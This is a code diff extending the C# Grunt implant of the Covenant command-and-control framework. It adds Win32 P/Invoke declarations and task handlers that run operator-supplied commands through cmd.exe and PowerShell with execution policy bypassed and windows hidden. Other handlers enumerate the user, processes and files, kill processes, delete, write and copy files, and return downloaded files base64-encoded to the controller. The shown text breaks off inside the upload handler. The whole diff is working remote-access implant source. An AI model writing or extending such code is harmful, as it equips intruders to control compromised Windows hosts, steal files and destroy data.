@@ -12,9 +12,257 @@ using System.Security.Principal;
 using System.Security.AccessControl;
 using System.Security.Cryptography;
 using System.Text.RegularExpressions;
+using System.Runtime.InteropServices;
 
 namespace GruntExecutor
 {
+    // P/Invoke Win32 API declarations
+    internal static class Native
+    {
+        // Constants
+        public const uint TH32CS_SNAPPROCESS = 0x00000002;
+        public const int MAX_PATH = 260;
+        public const uint GENERIC_READ = 0x80000000;
+        public const uint GENERIC_WRITE = 0x40000000;
+        public const uint FILE_SHARE_READ = 0x00000001;
+        public const uint FILE_SHARE_WRITE = 0x00000002;
+        public const uint OPEN_EXISTING = 3;
+        public const uint CREATE_ALWAYS = 2;
+        public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
+        public const uint INVALID_FILE_SIZE = 0xFFFFFFFF;
+        public const int INVALID_HANDLE_VALUE = -1;
+        public const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;
+
+        // Structures
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct PROCESSENTRY32W
+        {
+            public uint dwSize;
+            public uint cntUsage;
+            public uint th32ProcessID;
+            public IntPtr th32DefaultHeapID;
+            public uint th32ModuleID;
+            public uint cntThreads;
+            public uint th32ParentProcessID;
+            public int pcPriClassBase;
+            public uint dwFlags;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
+            public string szExeFile;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct WIN32_FIND_DATAW
+        {
+            public uint dwFileAttributes;
+            public System.Runtime.InteropServices.ComTypes.FILETIME ftCreationTime;
+            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastAccessTime;
+            public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWriteTime;
+            public uint nFileSizeHigh;
+            public uint nFileSizeLow;
+            public uint dwReserved0;
+            public uint dwReserved1;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
+            public string cFileName;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
+            public string cAlternateFileName;
+        }
+
+        // Kernel32 functions
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern uint GetCurrentDirectoryW(uint nBufferLength, StringBuilder lpBuffer);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool SetCurrentDirectoryW(string lpPathName);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern uint GetComputerNameW(StringBuilder lpBuffer, ref uint nSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr CreateFileW(
+            string lpFileName,
+            uint dwDesiredAccess,
+            uint dwShareMode,
+            IntPtr lpSecurityAttributes,
+            uint dwCreationDisposition,
+            uint dwFlagsAndAttributes,
+            IntPtr hTemplateFile);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadFile(
+            IntPtr hFile,
+            byte[] lpBuffer,
+            uint nNumberOfBytesToRead,
+            out uint lpNumberOfBytesRead,
+            IntPtr lpOverlapped);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteFile(
+            IntPtr hFile,
+            byte[] lpBuffer,
+            uint nNumberOfBytesToWrite,
+            out uint lpNumberOfBytesWritten,
+            IntPtr lpOverlapped);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint GetFileSize(IntPtr hFile, IntPtr lpFileSizeHigh);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr FindFirstFileW(string lpFileName, out WIN32_FIND_DATAW lpFindFileData);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool FindNextFileW(IntPtr hFindFile, out WIN32_FIND_DATAW lpFindFileData);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool FindClose(IntPtr hFindFile);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        public const uint PROCESS_TERMINATE = 0x0001;
+
+        // Additional file operation functions
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateDirectoryW(string lpPathName, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool DeleteFileW(string lpFileName);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool RemoveDirectoryW(string lpPathName);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CopyFileW(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern uint GetFileAttributesW(string lpFileName);
+
+        public const uint INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF;
+
+        // GDI32 functions for screenshot
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetDesktopWindow();
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetDC(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("user32.dll")]
+        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
+
+        [DllImport("gdi32.dll")]
+        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+
+        [DllImport("gdi32.dll")]
+        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+
+        [DllImport("gdi32.dll")]
+        public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
+
+        [DllImport("gdi32.dll")]
+        public static extern bool DeleteObject(IntPtr hObject);
+
+        [DllImport("gdi32.dll")]
+        public static extern bool DeleteDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        public static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);
+
+        public const uint SRCCOPY = 0x00CC0020;
+        public const uint DIB_RGB_COLORS = 0;
+        public const uint BI_RGB = 0;
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct RECT
+        {
+            public int Left;
+            public int Top;
+            public int Right;
+            public int Bottom;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct BITMAPINFOHEADER
+        {
+            public uint biSize;
+            public int biWidth;
+            public int biHeight;
+            public ushort biPlanes;
+            public ushort biBitCount;
+            public uint biCompression;
+            public uint biSizeImage;
+            public int biXPelsPerMeter;
+            public int biYPelsPerMeter;
+            public uint biClrUsed;
+            public uint biClrImportant;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct BITMAPINFO
+        {
+            public BITMAPINFOHEADER bmiHeader;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
+            public uint[] bmiColors;
+        }
+
+        // Advapi32 functions
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool GetUserNameW(StringBuilder lpBuffer, ref uint nSize);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool GetTokenInformation(
+            IntPtr TokenHandle,
+            uint TokenInformationClass,
+            IntPtr TokenInformation,
+            uint TokenInformationLength,
+            out uint ReturnLength);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool LookupAccountSidW(
+            string lpSystemName,
+            IntPtr Sid,
+            StringBuilder lpName,
+            ref uint cchName,
+            StringBuilder lpReferencedDomainName,
+            ref uint cchReferencedDomainName,
+            out uint peUse);
+
+        public const uint TOKEN_QUERY = 0x0008;
+        public const uint TokenUser = 1;
+
+        // Helper to get current process handle
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetCurrentProcess();
+
+        // Helper to convert FILETIME to DateTime
+        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME ft)
+        {
+            long hFT = (((long)ft.dwHighDateTime) << 32) + ft.dwLowDateTime;
+            return DateTime.FromFileTime(hFT);
+        }
+    }
     class Grunt
     {
         public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
@@ -209,6 +457,8 @@ namespace GruntExecutor
                                 t.Start();
                                 Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                             }
+                            // Clean up completed tasks to prevent memory leak
+                            Tasks.RemoveAll(kvp => !kvp.Value.IsAlive);
                         }
                         messenger.WriteTaskingMessage();
                     }
@@ -239,103 +489,710 @@ namespace GruntExecutor
             string output = "";
             try
             {
-                if (message.Type == GruntTaskingType.Assembly)
-                {
-                    string[] pieces = message.Message.Split(',');
-                    if (pieces.Length > 0)
-                    {
-                        object[] parameters = null;
-                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
-                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
-                        byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
-                        byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
-                        Assembly gruntTask = Assembly.Load(decompressedBytes);
-                        PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
-                        string results = "";
-                        if (streamProp == null)
-                        {
-                            results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
-                        }
-                        else
-                        {
-                            Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
-                            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
-                            {
-                                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
-                                {
-                                    streamProp.SetValue(null, pipeClient, null);
-                                    DateTime lastTime = DateTime.Now;
-                                    invokeThread.Start();
-                                    using (StreamReader reader = new StreamReader(pipeServer))
-                                    {
-                                        object synclock = new object();
-                                        string currentRead = "";
-                                        Thread readThread = new Thread(() => {
-                                            int count;
-                                            char[] read = new char[MAX_MESSAGE_SIZE];
-                                            while ((count = reader.Read(read, 0, read.Length)) > 0)
-                                            {
-                                                lock (synclock)
-                                                {
-                                                    currentRead += new string(read, 0, count);
-                                                }
-                                            }
-                                        });
-                                        readThread.Start();
-                                        while (readThread.IsAlive)
-                                        {
-                                            Thread.Sleep(Delay * 1000);
-                                            lock (synclock)
-                                            {
-                                                try
-                                                {
-                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)
-                                                    {
-                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                                        {
-                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                            try
-                                                            {
-                                                                GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
-                                                                messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                            }
-                                                            catch (Exception) {}
-                                                        }
-                                                        currentRead = "";
-                                                        lastTime = DateTime.Now;
-                                                    }
-                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
-                                                    {
-                                                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
-                                                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                        currentRead = "";
-                                                        lastTime = DateTime.Now;
-                                                    }
-                                                }
-                                                catch (ThreadAbortException) { break; }
-                                                catch (Exception) { currentRead = ""; }
-                                            }
-                                        }
-                                        output += currentRead;
-                                    }
-                                }
-                            }
-                            invokeThread.Join();
-                        }
-                        output += results;
-                    }
-                }
-                else if (message.Type == GruntTaskingType.Connect)
+                if (message.Type == GruntTaskingType.Connect)
                 {
                     string[] split = message.Message.Split(',');
-                    bool connected = messenger.Connect(split[0], split[1]);
-                    output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
-                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
+                    if (split.Length >= 2 && !string.IsNullOrEmpty(split[0]) && !string.IsNullOrEmpty(split[1]))
+                    {
+                        bool connected = messenger.Connect(split[0], split[1]);
+                        output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
+                                              "Connection to " + split[0] + ":" + split[1] + " failed.";
+                    }
+                    else
+                    {
+                        output += "Error: Invalid connect parameters. Expected format: hostname,pipename";
+                    }
                 }
                 else if (message.Type == GruntTaskingType.Disconnect)
                 {
                     bool disconnected = messenger.Disconnect(message.Message);
                     output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
+                }
+                else if (message.Type == GruntTaskingType.Shell)
+                {
+                    // Execute command directly via Process
+                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                    startInfo.FileName = message.Message.Split(' ')[0];
+                    startInfo.Arguments = message.Message.Contains(" ") ? message.Message.Substring(message.Message.IndexOf(' ') + 1) : "";
+                    startInfo.UseShellExecute = false;
+                    startInfo.RedirectStandardOutput = true;
+                    startInfo.RedirectStandardError = true;
+                    startInfo.CreateNoWindow = true;
+                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo))
+                    {
+                        output += process.StandardOutput.ReadToEnd();
+                        output += process.StandardError.ReadToEnd();
+                        process.WaitForExit();
+                    }
+                }
+                else if (message.Type == GruntTaskingType.ShellCmd)
+                {
+                    // Execute via cmd.exe /c
+                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                    startInfo.FileName = "cmd.exe";
+                    startInfo.Arguments = "/c " + message.Message;
+                    startInfo.UseShellExecute = false;
+                    startInfo.RedirectStandardOutput = true;
+                    startInfo.RedirectStandardError = true;
+                    startInfo.CreateNoWindow = true;
+                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo))
+                    {
+                        output += process.StandardOutput.ReadToEnd();
+                        output += process.StandardError.ReadToEnd();
+                        process.WaitForExit();
+                    }
+                }
+                else if (message.Type == GruntTaskingType.PowerShell)
+                {
+                    // Execute via powershell.exe
+                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                    startInfo.FileName = "powershell.exe";
+                    startInfo.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + message.Message.Replace("\"", "`\"") + "\"";
+                    startInfo.UseShellExecute = false;
+                    startInfo.RedirectStandardOutput = true;
+                    startInfo.RedirectStandardError = true;
+                    startInfo.CreateNoWindow = true;
+                    using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo))
+                    {
+                        output += process.StandardOutput.ReadToEnd();
+                        output += process.StandardError.ReadToEnd();
+                        process.WaitForExit();
+                    }
+                }
+                else if (message.Type == GruntTaskingType.WhoAmI)
+                {
+                    // P/Invoke: GetUserNameW + token lookup for domain\user
+                    try
+                    {
+                        IntPtr tokenHandle;
+                        if (Native.OpenProcessToken(Native.GetCurrentProcess(), Native.TOKEN_QUERY, out tokenHandle))
+                        {
+                            uint tokenInfoLength = 0;
+                            Native.GetTokenInformation(tokenHandle, Native.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);
+                            IntPtr tokenInfo = Marshal.AllocHGlobal((int)tokenInfoLength);
+                            try
+                            {
+                                if (Native.GetTokenInformation(tokenHandle, Native.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength))
+                                {
+                                    IntPtr sid = Marshal.ReadIntPtr(tokenInfo);
+                                    StringBuilder name = new StringBuilder(256);
+                                    StringBuilder domain = new StringBuilder(256);
+                                    uint nameSize = 256;
+                                    uint domainSize = 256;
+                                    uint sidType;
+                                    if (Native.LookupAccountSidW(null, sid, name, ref nameSize, domain, ref domainSize, out sidType))
+                                    {
+                                        output += domain.ToString() + "\\" + name.ToString();
+                                    }
+                                    else
+                                    {
+                                        // Fallback to GetUserNameW
+                                        StringBuilder userName = new StringBuilder(256);
+                                        uint userNameSize = 256;
+                                        if (Native.GetUserNameW(userName, ref userNameSize))
+                                        {
+                                            output += userName.ToString();
+                                        }
+                                    }
+                                }
+                            }
+                            finally
+                            {
+                                Marshal.FreeHGlobal(tokenInfo);
+                                Native.CloseHandle(tokenHandle);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Pwd)
+                {
+                    // P/Invoke: GetCurrentDirectoryW
+                    StringBuilder buffer = new StringBuilder(Native.MAX_PATH);
+                    uint result = Native.GetCurrentDirectoryW((uint)Native.MAX_PATH, buffer);
+                    if (result > 0)
+                    {
+                        output += buffer.ToString();
+                    }
+                    else
+                    {
+                        output += "Error: Failed to get current directory";
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Cd)
+                {
+                    // P/Invoke: SetCurrentDirectoryW
+                    if (Native.SetCurrentDirectoryW(message.Message))
+                    {
+                        StringBuilder buffer = new StringBuilder(Native.MAX_PATH);
+                        Native.GetCurrentDirectoryW((uint)Native.MAX_PATH, buffer);
+                        output += "Changed directory to: " + buffer.ToString();
+                    }
+                    else
+                    {
+                        output += "Error: Failed to change directory (code: " + Marshal.GetLastWin32Error() + ")";
+                    }
+                }
+                else if (message.Type == GruntTaskingType.ListDirectory)
+                {
+                    // P/Invoke: FindFirstFileW / FindNextFileW
+                    StringBuilder pwdBuffer = new StringBuilder(Native.MAX_PATH);
+                    Native.GetCurrentDirectoryW((uint)Native.MAX_PATH, pwdBuffer);
+                    string path = string.IsNullOrEmpty(message.Message) ? pwdBuffer.ToString() : message.Message;
+                    string searchPath = path.EndsWith("\\") ? path + "*" : path + "\\*";
+
+                    output += "Directory: " + path + Environment.NewLine + Environment.NewLine;
+
+                    Native.WIN32_FIND_DATAW findData;
+                    IntPtr hFind = Native.FindFirstFileW(searchPath, out findData);
+
+                    if (hFind.ToInt64() != Native.INVALID_HANDLE_VALUE)
+                    {
+                        try
+                        {
+                            do
+                            {
+                                if (findData.cFileName == "." || findData.cFileName == "..")
+                                    continue;
+
+                                DateTime lastWrite = Native.FileTimeToDateTime(findData.ftLastWriteTime);
+                                bool isDir = (findData.dwFileAttributes & Native.FILE_ATTRIBUTE_DIRECTORY) != 0;
+                                long fileSize = ((long)findData.nFileSizeHigh << 32) + findData.nFileSizeLow;
+
+                                if (isDir)
+                                {
+                                    output += string.Format("{0,-20} {1,-10} {2}", lastWrite.ToString("yyyy-MM-dd HH:mm"), "<DIR>", findData.cFileName) + Environment.NewLine;
+                                }
+                                else
+                                {
+                                    output += string.Format("{0,-20} {1,-10} {2}", lastWrite.ToString("yyyy-MM-dd HH:mm"), fileSize, findData.cFileName) + Environment.NewLine;
+                                }
+                            } while (Native.FindNextFileW(hFind, out findData));
+                        }
+                        finally
+                        {
+                            Native.FindClose(hFind);
+                        }
+                    }
+                    else
+                    {
+                        output += "Error: Failed to list directory (code: " + Marshal.GetLastWin32Error() + ")";
+                    }
+                }
+                else if (message.Type == GruntTaskingType.ReadFile)
+                {
+                    // P/Invoke: CreateFileW / ReadFile
+                    IntPtr hFile = Native.CreateFileW(
+                        message.Message,
+                        Native.GENERIC_READ,
+                        Native.FILE_SHARE_READ,
+                        IntPtr.Zero,
+                        Native.OPEN_EXISTING,
+                        Native.FILE_ATTRIBUTE_NORMAL,
+                        IntPtr.Zero);
+
+                    if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
+                    {
+                        try
+                        {
+                            uint fileSize = Native.GetFileSize(hFile, IntPtr.Zero);
+                            if (fileSize != Native.INVALID_FILE_SIZE && fileSize > 0)
+                            {
+                                byte[] buffer = new byte[fileSize];
+                                uint bytesRead;
+                                if (Native.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero))
+                                {
+                                    output += Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
+                                }
+                                else
+                                {
+                                    output += "Error: Failed to read file (code: " + Marshal.GetLastWin32Error() + ")";
+                                }
+                            }
+                            else if (fileSize == 0)
+                            {
+                                output += "(empty file)";
+                            }
+                            else
+                            {
+                                output += "Error: Failed to get file size (code: " + Marshal.GetLastWin32Error() + ")";
+                            }
+                        }
+                        finally
+                        {
+                            Native.CloseHandle(hFile);
+                        }
+                    }
+                    else
+                    {
+                        output += "Error: Failed to open file (code: " + Marshal.GetLastWin32Error() + ")";
+                    }
+                }
+                else if (message.Type == GruntTaskingType.WriteFile)
+                {
+                    // P/Invoke: CreateFileW / WriteFile
+                    try
+                    {
+                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
+                        if (parts.Length == 2)
+                        {
+                            byte[] content = Convert.FromBase64String(parts[1]);
+
+                            IntPtr hFile = Native.CreateFileW(
+                                parts[0],
+                                Native.GENERIC_WRITE,
+                                0,
+                                IntPtr.Zero,
+                                Native.CREATE_ALWAYS,
+                                Native.FILE_ATTRIBUTE_NORMAL,
+                                IntPtr.Zero);
+
+                            if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
+                            {
+                                try
+                                {
+                                    uint bytesWritten;
+                                    if (Native.WriteFile(hFile, content, (uint)content.Length, out bytesWritten, IntPtr.Zero))
+                                    {
+                                        output += "File written: " + parts[0] + " (" + bytesWritten + " bytes)";
+                                    }
+                                    else
+                                    {
+                                        output += "Error: Failed to write file (code: " + Marshal.GetLastWin32Error() + ")";
+                                    }
+                                }
+                                finally
+                                {
+                                    Native.CloseHandle(hFile);
+                                }
+                            }
+                            else
+                            {
+                                output += "Error: Failed to create file (code: " + Marshal.GetLastWin32Error() + ")";
+                            }
+                        }
+                        else
+                        {
+                            output += "Error: Invalid format. Use: path|base64content";
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.GetHostname)
+                {
+                    // P/Invoke: GetComputerNameW
+                    StringBuilder buffer = new StringBuilder(256);
+                    uint size = 256;
+                    if (Native.GetComputerNameW(buffer, ref size) != 0)
+                    {
+                        output += buffer.ToString();
+                    }
+                    else
+                    {
+                        output += "Error: Failed to get hostname (code: " + Marshal.GetLastWin32Error() + ")";
+                    }
+                }
+                else if (message.Type == GruntTaskingType.ProcessList)
+                {
+                    // P/Invoke: CreateToolhelp32Snapshot / Process32FirstW / Process32NextW
+                    output += string.Format("{0,-8} {1,-40} {2,-8}", "PID", "Name", "PPID") + Environment.NewLine;
+                    output += new string('-', 60) + Environment.NewLine;
+
+                    IntPtr hSnapshot = Native.CreateToolhelp32Snapshot(Native.TH32CS_SNAPPROCESS, 0);
+                    if (hSnapshot.ToInt64() != Native.INVALID_HANDLE_VALUE)
+                    {
+                        try
+                        {
+                            Native.PROCESSENTRY32W pe32 = new Native.PROCESSENTRY32W();
+                            pe32.dwSize = (uint)Marshal.SizeOf(typeof(Native.PROCESSENTRY32W));
+
+                            if (Native.Process32FirstW(hSnapshot, ref pe32))
+                            {
+                                do
+                                {
+                                    output += string.Format("{0,-8} {1,-40} {2,-8}", pe32.th32ProcessID, pe32.szExeFile, pe32.th32ParentProcessID) + Environment.NewLine;
+                                } while (Native.Process32NextW(hSnapshot, ref pe32));
+                            }
+                        }
+                        finally
+                        {
+                            Native.CloseHandle(hSnapshot);
+                        }
+                    }
+                    else
+                    {
+                        output += "Error: Failed to create snapshot (code: " + Marshal.GetLastWin32Error() + ")";
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Kill)
+                {
+                    // P/Invoke: OpenProcess / TerminateProcess
+                    try
+                    {
+                        uint pid = uint.Parse(message.Message);
+                        IntPtr hProcess = Native.OpenProcess(Native.PROCESS_TERMINATE, false, pid);
+                        if (hProcess != IntPtr.Zero)
+                        {
+                            try
+                            {
+                                if (Native.TerminateProcess(hProcess, 0))
+                                {
+                                    output += "Killed process: " + pid;
+                                }
+                                else
+                                {
+                                    output += "Error: Failed to terminate process (code: " + Marshal.GetLastWin32Error() + ")";
+                                }
+                            }
+                            finally
+                            {
+                                Native.CloseHandle(hProcess);
+                            }
+                        }
+                        else
+                        {
+                            output += "Error: Failed to open process (code: " + Marshal.GetLastWin32Error() + ")";
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.CreateDirectory)
+                {
+                    // P/Invoke: CreateDirectoryW
+                    try
+                    {
+                        if (Native.CreateDirectoryW(message.Message, IntPtr.Zero))
+                        {
+                            output += "Directory created: " + message.Message;
+                        }
+                        else
+                        {
+                            int error = Marshal.GetLastWin32Error();
+                            if (error == 183) // ERROR_ALREADY_EXISTS
+                            {
+                                output += "Directory already exists: " + message.Message;
+                            }
+                            else
+                            {
+                                output += "Error: Failed to create directory (code: " + error + ")";
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Delete)
+                {
+                    // P/Invoke: DeleteFileW or RemoveDirectoryW
+                    try
+                    {
+                        uint attrs = Native.GetFileAttributesW(message.Message);
+                        if (attrs == Native.INVALID_FILE_ATTRIBUTES)
+                        {
+                            output += "Error: Path does not exist: " + message.Message;
+                        }
+                        else if ((attrs & Native.FILE_ATTRIBUTE_DIRECTORY) != 0)
+                        {
+                            if (Native.RemoveDirectoryW(message.Message))
+                            {
+                                output += "Directory deleted: " + message.Message;
+                            }
+                            else
+                            {
+                                output += "Error: Failed to delete directory (code: " + Marshal.GetLastWin32Error() + ")";
+                            }
+                        }
+                        else
+                        {
+                            if (Native.DeleteFileW(message.Message))
+                            {
+                                output += "File deleted: " + message.Message;
+                            }
+                            else
+                            {
+                                output += "Error: Failed to delete file (code: " + Marshal.GetLastWin32Error() + ")";
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Copy)
+                {
+                    // P/Invoke: CopyFileW
+                    try
+                    {
+                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
+                        if (parts.Length == 2)
+                        {
+                            if (Native.CopyFileW(parts[0], parts[1], false))
+                            {
+                                output += "Copied: " + parts[0] + " -> " + parts[1];
+                            }
+                            else
+                            {
+                                output += "Error: Failed to copy file (code: " + Marshal.GetLastWin32Error() + ")";
+                            }
+                        }
+                        else
+                        {
+                            output += "Error: Invalid format. Use: source|destination";
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Download)
+                {
+                    // Download file from target - read file and return base64
+                    try
+                    {
+                        IntPtr hFile = Native.CreateFileW(
+                            message.Message,
+                            Native.GENERIC_READ,
+                            Native.FILE_SHARE_READ,
+                            IntPtr.Zero,
+                            Native.OPEN_EXISTING,
+                            Native.FILE_ATTRIBUTE_NORMAL,
+                            IntPtr.Zero);
+
+                        if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
+                        {
+                            try
+                            {
+                                uint fileSize = Native.GetFileSize(hFile, IntPtr.Zero);
+                                if (fileSize != Native.INVALID_FILE_SIZE && fileSize > 0)
+                                {
+                                    byte[] buffer = new byte[fileSize];
+                                    uint bytesRead;
+                                    if (Native.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero))
+                                    {
+                                        output += Convert.ToBase64String(buffer, 0, (int)bytesRead);
+                                    }
+                                    else
+                                    {
+                                        output += "Error: Failed to read file (code: " + Marshal.GetLastWin32Error() + ")";
+                                    }
+                                }
+                                else if (fileSize == 0)
+                                {
+                                    output += "";
+                                }
+                                else
+                                {
+                                    output += "Error: Failed to get file size (code: " + Marshal.GetLastWin32Error() + ")";
+                                }
+                            }
+                            finally
+                            {
+                                Native.CloseHandle(hFile);
+                            }
+                        }
+                        else
+                        {
+                            output += "Error: Failed to open file (code: " + Marshal.GetLastWin32Error() + ")";
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Upload)
+                {
+                    // Upload file to target - receive base64 and write file
+                    try
+                    {
+                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
+                        if (parts.Length == 2)
+                        {
+                            byte[] content = Convert.FromBase64String(parts[1]);
+
+                            IntPtr hFile = Native.CreateFileW(
+                                parts[0],
+                                Native.GENERIC_WRITE,
+                                0,
+                                IntPtr.Zero,
